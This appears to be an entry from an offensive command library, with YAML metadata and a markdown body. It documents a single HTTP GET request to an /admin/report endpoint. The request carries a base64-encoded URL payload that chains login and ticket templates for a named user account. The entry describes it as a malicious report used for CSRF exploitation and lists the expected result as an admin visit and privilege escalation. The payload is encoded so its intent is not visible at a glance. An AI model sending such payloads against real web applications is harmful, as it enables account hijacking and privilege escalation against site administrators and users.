---
data: >-
  GET
  /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI=
  HTTP/1.1
tags:
  - csrf
type: command
output: 'Report sent, triggering admin visit and escalation'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:05.945Z'
id: 46624007-0767-46bb-913b-7879683d4dd8
verified: false
validated: true
submitted: true
---
# get-admin-report

## Command

```bash
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI= HTTP/1.1
```

## Description

Sends a malicious report URL for CSRF exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Base64-encoded payload | Yes |

## Examples

HTTP GET with encoded url.

## Expected Output

Report accepted.

## Related

- CSRF techniques
